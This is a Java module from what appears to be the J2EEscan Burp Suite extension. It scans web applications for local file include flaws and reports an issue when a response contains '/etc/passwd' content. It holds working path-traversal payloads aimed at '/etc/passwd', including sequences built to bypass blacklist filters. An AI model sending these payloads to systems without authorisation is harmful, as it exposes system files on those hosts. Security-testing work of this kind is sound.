package burp.j2ee.issues.impl;


import static burp.HTTPMatcher.getMatches;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;

import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;


/**
 * Further checks for local file include vulnerabilities
 * 
 */
public class LFIAbsoluteModule implements IModule{

    private static final String TITLE = "Local File Include";
    private static final String DESCRIPTION = "J2EEscan identified a local file include vulnerability. "
            + "It was possible to retrieve configuration files from the remote system."
            + "<br /><br />"
            + "<b>References</b>:<br /><br />"
            + "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2169<br />"
            + "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-0202<br />"
            + "https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion<br />";
            
    private static final String REMEDY = "Execute a code review activity to mitigate the LFI vulnerability<br />"
                + "<b>References</b>:<br /><br />"
                + "http://www.hpenterprisesecurity.com/vulncat/en/vulncat/java/file_disclosure_spring_webflow.html<br />"
                + "https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion<br />"
                + "http://cwe.mitre.org/data/definitions/22.html<br />"
                + "https://www.securecoding.cert.org/confluence/display/cplusplus/FIO02-CPP.+Canonicalize+path+names+originating+from+untrusted+sources<br />"
                + "https://www.securecoding.cert.org/confluence/display/java/FIO16-J.+Canonicalize+path+names+before+validating+them";
     
    
    private PrintWriter stderr;
    private static final byte[] GREP_STRING = "root:".getBytes();
    
    // the ".../....///" sequences, can bypas the blacklist patterns that removes
    // "../" and "./" chars
    private static final List<byte[]> LFI_INJECTION_TESTS = Arrays.asList(
            ".../....///.../....///.../....///.../....///.../....///.../....///etc/passwd".getBytes(),
            ".../...//.../...//.../...//.../...//.../...//.../...//.../...//.../...//etc/passwd".getBytes(),
            "file:///etc/passwd".getBytes()
    );    
    
    
    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        
        IExtensionHelpers helpers = callbacks.getHelpers();
        List<IScanIssue> issues = new ArrayList<>();

        stderr = new PrintWriter(callbacks.getStderr(), true);
        
        
        for (byte[] INJ_TEST : LFI_INJECTION_TESTS) {
            
            // make a request containing our injection test in the insertion point
            byte[] checkRequest = insertionPoint.buildRequest(INJ_TEST);
            IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(
                    baseRequestResponse.getHttpService(), checkRequest);
            
            try {
                
                // look for matches of our active check grep string
                byte[] response =  checkRequestResponse.getResponse();
                List<int[]> matches = getMatches(response, GREP_STRING, helpers);
                if (matches.size() > 0) {

                    issues.add(new CustomScanIssue(
                            baseRequestResponse.getHttpService(),
                            helpers.analyzeRequest(baseRequestResponse).getUrl(),
                            checkRequestResponse,
                            TITLE,
                            DESCRIPTION,
                            REMEDY,
                            Risk.High,
                            Confidence.Certain
                    ));
                    
                    return issues;
                }
                
            } catch (Exception ex){
                stderr.println(ex);
            }
        }
        
        return issues;
    }
}
